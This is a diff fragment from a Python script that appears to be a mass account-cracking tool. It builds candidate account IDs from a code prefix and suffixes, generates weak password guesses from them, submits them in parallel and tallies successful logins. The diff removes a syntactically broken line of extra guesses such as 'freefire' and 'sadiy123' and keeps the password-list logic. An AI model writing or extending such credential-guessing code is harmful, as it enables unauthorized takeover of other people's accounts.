@@ -653,7 +653,7 @@ def bd():
         linex()
         for love in user:
             ids = code+love
-            passlist = [ids,love,ids[:8],ids[:7],code+code,love[1:],ids[:6],love[2:]] 'freefire', 'Bangladesh', 'bangla', 'free fire', '@nusrat@', 'sadiy123', 'sakid@11
+            passlist = [ids,love,ids[:8],ids[:7],code+code,love[1:],ids[:6],love[2:]] 
             crack_submit.submit(__DEK__,ids,passlist,tl,ck)
     print("");linex();print(f"\033[1;32m[✓] \033[0;37m PROCESS HAS BEEN COMPLETED");print(f"\033[1;32m[✓] \033[0;37m TOTAL OK   ▶︎ \033[1;32m{len(oks)}");linex();exit()
  #__________________| PAKISTAN |_________________
